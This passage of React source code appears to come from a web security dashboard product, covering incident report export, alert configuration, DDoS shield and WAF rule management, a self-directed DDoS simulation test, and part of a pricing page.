        <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, color: 'var(--e-muted)', letterSpacing: 1 }}>RESPONSE TIME DISTRIBUTION (ms)</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
          {[
            { range: '<10ms', pct: 62, color: 'var(--green)' },
            { range: '10-50ms', pct: 22, color: 'var(--green)' },
            { range: '50-100ms', pct: 9, color: 'var(--yellow)' },
            { range: '100-500ms', pct: 5, color: 'var(--yellow)' },
            { range: '500ms-1s', pct: 1, color: 'var(--orange)' },
            { range: '>1s', pct: 1, color: 'var(--red)' },
          ].map(({ range, pct, color }) => (
            <div key={range} style={{ textAlign: 'center' }}>
              <div style={{ height: 60, background: 'rgba(255,255,255,0.03)', borderRadius: 4, display: 'flex', alignItems: 'flex-end', overflow: 'hidden' }}>
                <div style={{ width: '100%', height: `${pct}%`, background: color, opacity: 0.7 }} />
              </div>
              <div style={{ fontSize: 9, color: 'var(--e-muted)', marginTop: 4 }}>{range}</div>
              <div style={{ fontSize: 10, color, fontWeight: 600 }}>{pct}%</div>
            </div>
          ))}
        </div>
      </div>
    </MotionDiv>
  );
}

function OpsReports() {
  useEngineSnapshot(() => engine.getStateVersion());
  const stats = engine.getStats();
  const blocked = engine.getBlockedIPs();
  const [testResult, setTestResult] = useState(null);

  const generateReport = () => {
    if (stats.total === 0) {
      alert('No attack data - simulate attacks first');
      return;
    }

    const lines = [
      '=======================================',
      '    AUTOSHIELD AI - INCIDENT REPORT',
      '    CONFIDENTIAL - SOC USE ONLY',
      '=======================================',
      '',
      `Generated: ${new Date().toISOString()}`,
      '',
      '--- Executive Summary ---',
      `Total Events: ${stats.total}`,
      `Blocked: ${stats.blocked} (${stats.blockRate}%)`,
      `Unique Blocked IPs: ${blocked.length}`,
      '',
      '--- Attack Distribution ---',
      ...Object.entries(stats.byType).map(([t, c]) => `  ${t}: ${c} events (${Math.round((c / stats.total) * 100)}%)`),
      '',
      '--- Blocked IPs ---',
      ...blocked.slice(0, 20).map((ip) => `  * ${ip}`),
      '',
      '--- Recommendations ---',
      '  1. Review blocked IPs for false positives',
      '  2. Update WAF signatures',
      '  3. Coordinate with upstream ISPs',
    ];

    const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement('a');
    anchor.href = url;
    anchor.download = 'autoshield_report.txt';
    anchor.click();
    URL.revokeObjectURL(url);
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>📑 Operations & Reports</h1>
          <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>System configuration, data export, and alert routing</p>
        </div>
        <div style={{ display: 'flex', gap: 12 }}>
          <button className="evolve-btn-outline" onClick={() => window.print()}>🖨️ PDF Export</button>
          <button className="evolve-btn" onClick={() => {
            const data = JSON.stringify(engine.getLog(), null, 2);
            const blob = new Blob([data], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `autoshield-threat-export-${Date.now()}.json`;
            a.click();
          }}>📦 Export PCAP / JSON</button>
        </div>
      </div>

      <div className="ops-grid">
        <div>
          <div className="glass-card" style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 14 }}>📄 Incident Report Generator</div>
            <button className="btn-primary" style={{ width: '100%' }} onClick={generateReport}>🖨 Generate & Download Report</button>
            <div className="ops-includes">
              ✓ Executive summary + statistics<br />
              ✓ Full attack log ({stats.total} events)<br />
              ✓ Blocked IP table ({blocked.length} IPs)<br />
              ✓ SQLi/XSS/LFI/CMDi recommendations<br />
              ✓ CONFIDENTIAL classification
            </div>
          </div>

          {stats.total > 0 && (
            <div className="glass-card">
              <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 10 }}>Session Summary</div>
              <div className="session-stats">
                <div className="session-stat">
                  <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--cyan)' }}>{stats.total}</div>
                  <div style={{ fontSize: 9, color: 'var(--muted)', fontFamily: 'var(--mono)', textTransform: 'uppercase' }}>Total Events</div>
                </div>
                <div className="session-stat">
                  <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--green)' }}>{stats.blockRate}%</div>
                  <div style={{ fontSize: 9, color: 'var(--muted)', fontFamily: 'var(--mono)', textTransform: 'uppercase' }}>Block Rate</div>
                </div>
              </div>
            </div>
          )}
        </div>

        <div>
          <div className="glass-card" style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 14 }}>🚨 Alert Configuration</div>
            <div className="alert-channel">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontSize: 13, fontWeight: 600 }}>📱 WhatsApp / Twilio</span>
                <span style={{ background: 'rgba(8,11,16,.5)', color: 'var(--muted2)', border: '1px solid var(--line)', padding: '3px 10px', borderRadius: 6, fontSize: 9, fontFamily: 'var(--mono)' }}>NOT SET</span>
              </div>
              <div style={{ fontSize: 10, color: 'var(--muted2)', fontFamily: 'var(--mono)', marginTop: 8 }}>Set env: TWILIO_SID + ALERT_WA_TO</div>
            </div>
            <div className="alert-channel">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontSize: 13, fontWeight: 600 }}>📧 Email / SMTP</span>
                <span style={{ background: 'rgba(8,11,16,.5)', color: 'var(--muted2)', border: '1px solid var(--line)', padding: '3px 10px', borderRadius: 6, fontSize: 9, fontFamily: 'var(--mono)' }}>NOT SET</span>
              </div>
              <div style={{ fontSize: 10, color: 'var(--muted2)', fontFamily: 'var(--mono)', marginTop: 8 }}>Set env: SMTP_USER + ALERT_EMAIL_TO</div>
            </div>
            <div className="alert-rules">
              🔴 CRITICAL -&gt; immediate alert<br />
              🟡 HIGH -&gt; alert after 5 events/min<br />
              ⏱ Cooldown: 120s per IP<br />
              📤 WhatsApp + Email (parallel)
            </div>
            <button className="btn-secondary btn-sm" style={{ width: '100%' }} onClick={() => setTestResult('WhatsApp: SKIPPED · Email: SKIPPED (env not configured)')}>
              📨 Send Test Alert
            </button>
            {testResult && <div style={{ marginTop: 10, background: 'rgba(8,11,16,.5)', border: '1px solid var(--line)', borderRadius: 10, padding: '10px 14px', fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--yellow)' }}>{testResult}</div>}
          </div>
        </div>
      </div>
    </MotionDiv>
  );
}

function DDoSShieldTab() {
  useEngineSnapshot(() => engine.getStateVersion());
  const ddos = engine.getDDoSState();
  const rateConfig = engine.getRateLimitConfig();
  const isPremium = engine.isPremium();
  const [engaging, setEngaging] = useState(false);
  const [backendStatus, setBackendStatus] = useState(null);
  const [wafRules, setWafRules] = useState([]);
  const [wafLoading, setWafLoading] = useState(false);
  const [showAddRule, setShowAddRule] = useState(false);
  const [newRule, setNewRule] = useState({ name: '', attack_type: 'SQLi', pattern: '', severity: 'HIGH' });
  const [addingRule, setAddingRule] = useState(false);
  const API_BASE = API_URL; // Use global API_URL instead of re-calculating with potentially different port
  const authHeaders = () => { const t = localStorage.getItem('as_token'); return t ? { 'Content-Type': 'application/json', 'X-AutoShield-Key': t } : { 'Content-Type': 'application/json' }; };

  // Poll backend DDoS status every 5s
  useEffect(() => {
    engine.fetchDDoSStatus();
    const iv = setInterval(() => { engine.fetchDDoSStatus().then(d => d && setBackendStatus(d)); }, 5000);
    return () => clearInterval(iv);
  }, []);

  // Load WAF rules
  useEffect(() => {
    setWafLoading(true);
    fetch(`${API_BASE}/rules`, { headers: authHeaders() })
      .then(r => r.ok ? r.json() : { rules: [] })
      .then(d => setWafRules(d.rules || []))
      .catch(() => setWafRules([]))
      .finally(() => setWafLoading(false));
  }, []);

  const handleEngage = async () => {
    setEngaging(true);
    try {
      if (ddos.active) {
        await engine.disengageDDoSShield();
      } else {
        await engine.engageDDoSShield();
      }
    } catch (_) { }
    setEngaging(false);
  };

  const [testIntensity, setTestIntensity] = useState(5);
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState(null);

  const handleDDoSTest = async () => {
    if (!isPremium) {
      setTestResult({ status: 'denied', message: 'DDoS testing requires Premium tier.' });
      return;
    }
    setTesting(true);
    setTestResult(null);
    try {
      const token = localStorage.getItem('as_token');
      const res = await fetch(`${API_BASE}/ddos/test`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-AutoShield-Key': token || '' },
        body: JSON.stringify({ intensity: testIntensity }),
      });
      const data = await res.json();
      setTestResult(data);
      engine.fetchDDoSStatus();
    } catch (err) {
      setTestResult({ status: 'error', message: 'Test failed: ' + String(err) });
    } finally {
      setTesting(false);
    }
  };

  const toggleRule = async (ruleId, currentEnabled) => {
    await fetch(`${API_BASE}/rules/${ruleId}`, {
      method: 'PUT',
      headers: authHeaders(),
      body: JSON.stringify({ enabled: !currentEnabled }),
    });
    setWafRules(prev => prev.map(r => r.id === ruleId ? { ...r, enabled: !currentEnabled } : r));
  };

  const addRule = async () => {
    if (!newRule.name || !newRule.pattern) return;
    setAddingRule(true);
    try {
      const res = await fetch(`${API_BASE}/rules`, {
        method: 'POST',
        headers: authHeaders(),
        body: JSON.stringify(newRule),
      });
      if (res.ok) {
        const data = await res.json();
        setWafRules(prev => [...prev, { ...newRule, id: data.rule_id, enabled: true, created_at: new Date().toISOString() }]);
        setNewRule({ name: '', attack_type: 'SQLi', pattern: '', severity: 'HIGH' });
        setShowAddRule(false);
      }
    } catch (_) { } finally { setAddingRule(false); }
  };

  const shieldEngaged = ddos.active || backendStatus?.engaged;
  const topAttackers = ddos.topAttackers.length > 0 ? ddos.topAttackers : (backendStatus?.top_attackers || []);

  return (
    <>
      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
        <div>
          <div style={{ fontSize: 15, fontWeight: 800, letterSpacing: 0.5 }}>🛡️ DDoS Shield & WAF Rules</div>
          <div style={{ fontSize: 11, color: 'var(--e-muted)', marginTop: 2 }}>Real-time attack mitigation engine — powered by iptables</div>
        </div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{
            fontSize: 10, padding: '3px 10px', borderRadius: 999, fontWeight: 700, letterSpacing: 1,
            background: shieldEngaged ? 'rgba(255,60,60,0.15)' : 'rgba(0,255,156,0.1)',
            color: shieldEngaged ? 'var(--red)' : 'var(--green)',
            border: `1px solid ${shieldEngaged ? 'rgba(255,60,60,0.3)' : 'rgba(0,255,156,0.3)'}`,
          }}>
            {shieldEngaged ? '🔴 SHIELD ENGAGED' : '🟢 MONITORING'}
          </span>
          <span style={{ fontSize: 10, padding: '3px 10px', borderRadius: 999, background: 'rgba(0,200,255,0.1)', color: 'var(--cyan)', border: '1px solid rgba(0,200,255,0.2)' }}>
            {backendStatus?.firewall_mode === 'iptables' ? '🔥 iptables' : '💻 in-memory'}
          </span>
        </div>
      </div>

      <div className="dash-grid">
        {/* Left column */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          {/* Main Shield Card */}
          <div className="glass-card" style={{ position: 'relative', overflow: 'hidden' }}>
            {shieldEngaged && (
              <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: 3, background: 'linear-gradient(90deg, var(--red), var(--orange))', animation: 'shimmer 1.5s infinite' }} />
            )}
            <div style={{ textAlign: 'center', padding: '24px 0' }}>
              <div style={{
                width: 80, height: 80, borderRadius: '50%', margin: '0 auto 16px',
                background: shieldEngaged ? 'radial-gradient(circle, rgba(255,60,60,0.3), rgba(255,60,60,0.05))' : 'radial-gradient(circle, rgba(0,255,156,0.2), rgba(0,255,156,0.03))',
                border: `2px solid ${shieldEngaged ? 'rgba(255,60,60,0.5)' : 'rgba(0,255,156,0.4)'}`,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                fontSize: 32, boxShadow: shieldEngaged ? '0 0 30px rgba(255,60,60,0.3)' : '0 0 20px rgba(0,255,156,0.15)',
                animation: shieldEngaged ? 'pulse-dot 1.5s infinite' : 'none',
              }}>🛡️</div>
              <div style={{ fontSize: 18, fontWeight: 800, marginBottom: 4 }}>
                {shieldEngaged ? 'SHIELD ENGAGED' : 'SHIELD STANDBY'}
              </div>
              <div style={{ fontSize: 11, color: 'var(--e-muted)', marginBottom: 20 }}>
                {shieldEngaged
                  ? `Blocking IPs exceeding ${backendStatus?.threshold || 10} req/${backendStatus?.window_seconds || 10}s`
                  : 'Enable to block high-rate traffic in real time'}
              </div>
              {isPremium ? (
                <button
                  onClick={handleEngage}
                  disabled={engaging}
                  style={{
                    padding: '12px 28px', borderRadius: 8, fontSize: 13, fontWeight: 700, cursor: 'pointer',
                    border: 'none', letterSpacing: 0.5,
                    background: shieldEngaged ? 'linear-gradient(135deg, #ff4d4d, #cc2200)' : 'linear-gradient(135deg, var(--blue), #0066cc)',
                    color: 'white', boxShadow: shieldEngaged ? '0 4px 20px rgba(255,60,60,0.4)' : '0 4px 20px rgba(0,120,255,0.4)',
                    opacity: engaging ? 0.7 : 1, transition: 'all 0.2s',
                  }}
                >
                  {engaging ? '⏳ Processing...' : shieldEngaged ? '⛔ Disengage Shield' : '🚀 Engage DDoS Shield'}
                </button>
              ) : (
                <div style={{ padding: '12px 20px', background: 'rgba(255,193,7,0.1)', border: '1px solid rgba(255,193,7,0.3)', borderRadius: 8, fontSize: 11, color: 'var(--yellow)' }}>
                  ⭐ DDoS Shield requires <strong>Premium</strong> — <a href="/pricing" style={{ color: 'var(--cyan)' }}>Upgrade Now</a>
                </div>
              )}
            </div>

            {/* Stats row */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12, marginTop: 16 }}>
              {[
                { label: 'REQ TRACKED', value: backendStatus?.total_requests_tracked?.toLocaleString() || '0' },
                { label: 'TOTAL DROPPED', value: (backendStatus?.total_dropped || ddos.mitigatedCount)?.toLocaleString() },
                { label: 'ACTIVE IPS', value: topAttackers.length },
              ].map(s => (
                <div key={s.label} style={{ background: 'rgba(0,0,0,0.25)', borderRadius: 8, padding: '10px', textAlign: 'center', border: '1px solid rgba(255,255,255,0.05)' }}>
                  <div style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 4 }}>{s.label}</div>
                  <div style={{ fontSize: 18, fontWeight: 800, color: 'white' }}>{s.value}</div>
                </div>
              ))}
            </div>
          </div>

          {/* DDoS Socket Test Card */}
          <div className="glass-card" style={{ border: '1px solid rgba(251,191,36,0.15)', background: 'rgba(251,191,36,0.03)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: '#fbbf24' }}>💥 DDoS Simulation Tester</div>
              <span style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace' }}>RFC5737 TEST-NET-3</span>
            </div>
            <div style={{ fontSize: 11, color: 'var(--e-muted)', marginBottom: 14, lineHeight: 1.5 }}>
              Fires synthetic high-rate requests to validate detection pipeline. Uses reserved IP 198.51.100.254 — will never block real users.
            </div>
            <div style={{ marginBottom: 12 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontSize: 10, color: 'var(--e-muted)', letterSpacing: 1 }}>INTENSITY</span>
                <span style={{ fontSize: 12, color: '#fbbf24', fontWeight: 700, fontFamily: 'monospace' }}>{testIntensity}/10 ({testIntensity * 4} req burst)</span>
              </div>
              <input
                type="range" min={1} max={10} value={testIntensity}
                onChange={e => setTestIntensity(Number(e.target.value))}
                style={{ width: '100%', accentColor: '#fbbf24' }}
              />
            </div>
            <button
              onClick={handleDDoSTest}
              disabled={testing}
              style={{
                width: '100%', padding: '10px 0', borderRadius: 6, fontSize: 12, fontWeight: 700, cursor: testing ? 'wait' : 'pointer', border: 'none', letterSpacing: 1,
                background: testing ? 'rgba(251,191,36,0.3)' : 'linear-gradient(135deg, #d97706, #fbbf24)',
                color: testing ? 'var(--e-muted)' : '#000',
                transition: 'all 0.2s'
              }}
            >
              {testing ? '⏳ FIRING BURST...' : '💥 FIRE DDoS TEST'}
            </button>
            {testResult && (
              <div style={{ marginTop: 12, padding: '10px 14px', borderRadius: 6, background: testResult.ddos_triggered ? 'rgba(239,68,68,0.1)' : 'rgba(34,197,94,0.08)', border: `1px solid ${testResult.ddos_triggered ? 'rgba(239,68,68,0.3)' : 'rgba(34,197,94,0.2)'}` }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: testResult.ddos_triggered ? '#ef4444' : '#22c55e', marginBottom: 4 }}>{testResult.message}</div>
                {testResult.events_fired && <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'monospace' }}>Fired: {testResult.events_fired} events | Intensity: {testResult.intensity}/10</div>}
              </div>
            )}
          </div>

          {/* Rate Limit Config */}
          <div className="glass-card">
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 14 }}>⚡ Rate Limiting Config</div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
              {[
                { label: 'MAX REQUESTS', value: rateConfig.maxRequests, sub: `per ${rateConfig.windowMs / 1000}s` },
                { label: 'ESCALATION', value: `${rateConfig.escalationThreshold}x`, sub: 'warnings → auto-block' },
              ].map(c => (
                <div key={c.label} style={{ background: 'rgba(0,0,0,0.2)', padding: 12, borderRadius: 8, border: '1px solid rgba(255,255,255,0.05)' }}>
                  <div style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 4 }}>{c.label}</div>
                  <div style={{ fontSize: 20, fontWeight: 800 }}>{c.value}</div>
                  <div style={{ fontSize: 9, color: 'var(--e-muted)', marginTop: 2 }}>{c.sub}</div>
                </div>
              ))}
            </div>
            <div style={{ marginTop: 12, padding: '8px 12px', borderRadius: 6, background: 'rgba(0,200,255,0.07)', border: '1px solid rgba(0,200,255,0.15)', fontSize: 10, color: 'var(--cyan)' }}>
              💡 DDoS mode threshold: {backendStatus?.threshold || 10} req/{backendStatus?.window_seconds || 10}s per IP
            </div>
          </div>
        </div>

        {/* Right column: Top Attackers + WAF rules */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          {/* Top Attackers */}
          <div className="glass-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 700 }}>🎯 Live Top Attackers</div>
              <span style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'monospace' }}>AUTO-REFRESH 5s</span>
            </div>
            <div style={{ maxHeight: 300, overflowY: 'auto' }}>
              {topAttackers.length === 0 ? (
                <div style={{ padding: '30px 0', textAlign: 'center', color: 'var(--e-muted)', fontSize: 12 }}>
                  <div style={{ fontSize: 24, marginBottom: 8 }}>🌿</div>
                  No significant volumetric attackers detected.
                </div>
              ) : (
                topAttackers.map((atk, i) => {
                  const geo = atk.geo || getGeoForIP(atk.ip);
                  const reqPer10s = atk.req_per_10s ?? atk.count ?? 0;
                  const pct = Math.min(100, (reqPer10s / (backendStatus?.threshold || 10)) * 100);
                  return (
                    <div key={i} style={{ padding: '10px 0', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                        <div>
                          <div style={{ fontSize: 13, fontWeight: 600, color: '#ff6b6b', fontFamily: 'monospace' }}>{atk.ip}</div>
                          <div style={{ fontSize: 10, color: 'var(--e-muted)' }}>{geo?.country} · {reqPer10s} req/10s</div>
                        </div>
                        <div style={{ textAlign: 'right' }}>
                          <div style={{ fontSize: 10, color: atk.blocked ? 'var(--red)' : 'var(--yellow)', fontWeight: 700 }}>
                            {atk.blocked ? 'BLOCKED' : 'MONITORING'}
                          </div>
                          {atk.blocked && (
                            <button onClick={() => engine.unblockIP(atk.ip)} style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.15)', color: 'var(--cyan)', padding: '1px 6px', borderRadius: 4, fontSize: 9, cursor: 'pointer', marginTop: 2 }}>
                              Unblock
                            </button>
                          )}
                        </div>
                      </div>
                      <div style={{ height: 3, background: 'rgba(255,255,255,0.07)', borderRadius: 2 }}>
                        <div style={{ height: '100%', width: `${pct}%`, borderRadius: 2, background: pct >= 100 ? 'var(--red)' : pct > 70 ? 'var(--orange)' : 'var(--yellow)', transition: 'width 0.5s' }} />
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>

          {/* WAF Rules Manager */}
          <div className="glass-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14 }}>
              <div style={{ fontSize: 12, fontWeight: 700 }}>🧱 WAF Detection Rules</div>
              {isPremium && (
                <button onClick={() => setShowAddRule(!showAddRule)} style={{ background: showAddRule ? 'rgba(255,60,60,0.15)' : 'rgba(0,200,255,0.1)', border: `1px solid ${showAddRule ? 'rgba(255,60,60,0.3)' : 'rgba(0,200,255,0.2)'}`, color: showAddRule ? 'var(--red)' : 'var(--cyan)', padding: '4px 12px', borderRadius: 6, fontSize: 11, cursor: 'pointer' }}>
                  {showAddRule ? '✕ Cancel' : '+ Add Rule'}
                </button>
              )}
            </div>

            {showAddRule && (
              <div style={{ background: 'rgba(0,0,0,0.25)', borderRadius: 8, padding: 14, marginBottom: 14, border: '1px solid rgba(0,200,255,0.15)' }}>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 8 }}>
                  <input value={newRule.name} onChange={e => setNewRule(p => ({ ...p, name: e.target.value }))} placeholder="Rule name..." style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, padding: '6px 10px', color: 'white', fontSize: 11 }} />
                  <select value={newRule.attack_type} onChange={e => setNewRule(p => ({ ...p, attack_type: e.target.value }))} style={{ background: '#0d1117', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, padding: '6px 10px', color: 'white', fontSize: 11 }}>
                    {['SQLi', 'XSS', 'LFI', 'CMDi', 'Custom'].map(t => <option key={t}>{t}</option>)}
                  </select>
                </div>
                <input value={newRule.pattern} onChange={e => setNewRule(p => ({ ...p, pattern: e.target.value }))} placeholder="Regex pattern (e.g. (?i)union\s+select)..." style={{ background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, padding: '6px 10px', color: 'white', fontSize: 11, width: '100%', boxSizing: 'border-box', marginBottom: 8, fontFamily: 'monospace' }} />
                <div style={{ display: 'flex', gap: 8 }}>
                  <select value={newRule.severity} onChange={e => setNewRule(p => ({ ...p, severity: e.target.value }))} style={{ background: '#0d1117', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, padding: '6px 10px', color: 'white', fontSize: 11, flex: 1 }}>
                    {['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].map(s => <option key={s}>{s}</option>)}
                  </select>
                  <button onClick={addRule} disabled={addingRule} style={{ background: 'linear-gradient(135deg, var(--blue), #0066cc)', border: 'none', borderRadius: 6, padding: '6px 16px', color: 'white', fontSize: 11, fontWeight: 700, cursor: 'pointer', flex: 2 }}>
                    {addingRule ? '⏳ Adding...' : '✓ Create Rule'}
                  </button>
                </div>
              </div>
            )}

            <div style={{ maxHeight: 250, overflowY: 'auto' }}>
              {wafLoading ? (
                <div style={{ padding: 20, textAlign: 'center', color: 'var(--e-muted)', fontSize: 12 }}>Loading rules...</div>
              ) : wafRules.length === 0 ? (
                <div style={{ padding: 20, textAlign: 'center', color: 'var(--e-muted)', fontSize: 12 }}>No WAF rules found.</div>
              ) : (
                wafRules.slice(0, 15).map((rule) => (
                  <div key={rule.id} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 0', borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontSize: 11, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span style={{ width: 6, height: 6, borderRadius: '50%', background: rule.enabled ? 'var(--green)' : 'var(--e-muted)', display: 'inline-block', flexShrink: 0 }} />
                        <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{rule.name}</span>
                      </div>
                      <div style={{ fontSize: 9, color: 'var(--e-muted)', marginTop: 2, fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '100%' }}>
                        [{rule.attack_type}] {rule.pattern?.slice(0, 40) || '...'}
                      </div>
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0 }}>
                      <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, background: rule.severity === 'CRITICAL' ? 'rgba(255,60,60,0.15)' : rule.severity === 'HIGH' ? 'rgba(249,115,22,0.15)' : 'rgba(234,179,8,0.15)', color: rule.severity === 'CRITICAL' ? 'var(--red)' : rule.severity === 'HIGH' ? 'var(--orange)' : 'var(--yellow)' }}>{rule.severity}</span>
                      {isPremium && (
                        <button onClick={() => toggleRule(rule.id, rule.enabled)} style={{ background: rule.enabled ? 'rgba(0,255,156,0.1)' : 'rgba(255,255,255,0.05)', border: `1px solid ${rule.enabled ? 'rgba(0,255,156,0.2)' : 'rgba(255,255,255,0.1)'}`, color: rule.enabled ? 'var(--green)' : 'var(--e-muted)', padding: '2px 8px', borderRadius: 4, fontSize: 9, cursor: 'pointer' }}>
                          {rule.enabled ? 'ON' : 'OFF'}
                        </button>
                      )}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

// ═══════════════════════════════════════════════════════
// PRICING PAGE
// ═══════════════════════════════════════════════════════
function PricingPage() {
  const navigate = useNavigate();
  useEngineSnapshot(() => engine.getStateVersion());
  const isPremium = engine.isPremium();
  const [annual, setAnnual] = useState(true);

  const plans = [
    {
      name: 'Free',
      price: '$0',
      period: 'forever',
      accent: 'var(--muted)',
      features: [
        { text: 'Up to 3 protected sites', included: true },
        { text: 'Basic WAF rules', included: true },
        { text: 'Real-time attack feed', included: true },
        { text: 'Email alerts', included: true },
        { text: 'Community support', included: true },
        { text: 'Custom WAF rules', included: false },
        { text: 'Geographic IP blocking', included: false },
        { text: 'DDoS Shield Pro', included: false },
        { text: 'Custom rate limiting', included: false },
        { text: 'Advanced PDF reports', included: false },
        { text: 'Webhook & SIEM integration', included: false },
        { text: 'Priority edge routing', included: false },
      ],
      cta: isPremium ? 'Downgrade' : 'Current Plan',
      action: async () => {
        if (!isPremium) return;
        try {
          const res = await fetch(`${API_URL}/checkout/cancel`, { method: 'POST', headers: engine.getHeaders() });
          if (res.ok) {
            engine.setUserTier('free');
            engine.fetchState();
          } else {
            const err = await res.json().catch(() => ({}));
            engine.addNotification('system', 'Downgrade Failed', err.detail || 'Server error', 'high');
          }
        } catch (_) {
          engine.addNotification('system', 'Connection Error', 'Backend unreachable.', 'high');
        }
      },
      disabled: !isPremium,
    },
    {
      name: 'Premium',
      price: annual ? '$49' : '$59',
      period: annual ? '/mo (billed annually)' : '/mo',
      accent: '#ffd700',
      highlight: true,
      features: [
        { text: 'Unlimited protected sites', included: true },
        { text: 'Advanced WAF engine', included: true },
        { text: 'Real-time attack feed', included: true },
        { text: 'Priority email + SMS alerts', included: true },
        { text: '24/7 priority support', included: true },
        { text: 'Custom WAF rules', included: true },
        { text: 'Geographic IP blocking', included: true },
        { text: 'DDoS Shield Pro', included: true },
        { text: 'Custom rate limiting', included: true },
        { text: 'Advanced PDF reports', included: true },
        { text: 'Webhook & SIEM integration', included: true },
        { text: 'Priority edge routing', included: true },
      ],
      cta: isPremium ? 'Current Plan' : 'Upgrade Now',
      action: () => { if (!isPremium) navigate('/checkout'); },
      disabled: isPremium,
    },
    {
      name: 'Enterprise',
      price: 'Custom',
      period: 'contact sales',
      accent: 'var(--cyan)',
      features: [
        { text: 'Everything in Premium', included: true },
        { text: 'Dedicated edge partition', included: true },
        { text: 'Custom ML model training', included: true },
        { text: 'SSO / SAML integration', included: true },
        { text: 'Dedicated account manager', included: true },
        { text: 'SLA guarantee (99.99%)', included: true },
        { text: 'On-premise deployment', included: true },
        { text: 'Compliance (SOC2, GDPR)', included: true },
        { text: 'Custom threat intelligence', included: true },
        { text: 'White-label option', included: true },
        { text: 'API rate: unlimited', included: true },
        { text: 'Custom integrations', included: true },
      ],
      cta: 'Contact Sales',
      action: () => { engine.addNotification('system', '📧 Sales Contacted', 'Our enterprise team will reach out within 24 hours.', 'success'); },
      disabled: false,
    },
  ];

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ textAlign: 'center', marginBottom: 48 }}>
        <h1 style={{ fontFamily: 'Anton', fontSize: 48, margin: 0, textTransform: 'uppercase', letterSpacing: 2 }}>Choose Your Shield</h1>
        <p style={{ color: 'var(--e-muted)', fontSize: 15, marginTop: 12 }}>Enterprise-grade protection for every scale</p>

        <div style={{ display: 'inline-flex', background: 'rgba(255,255,255,0.04)', borderRadius: 8, padding: 4, marginTop: 24, border: '1px solid rgba(255,255,255,0.06)' }}>
          <button onClick={() => setAnnual(false)} style={{ padding: '8px 20px', borderRadius: 6, fontSize: 12, fontWeight: 600, border: 'none', cursor: 'pointer', background: !annual ? 'rgba(255,255,255,0.1)' : 'transparent', color: !annual ? 'white' : 'var(--muted)' }}>Monthly</button>
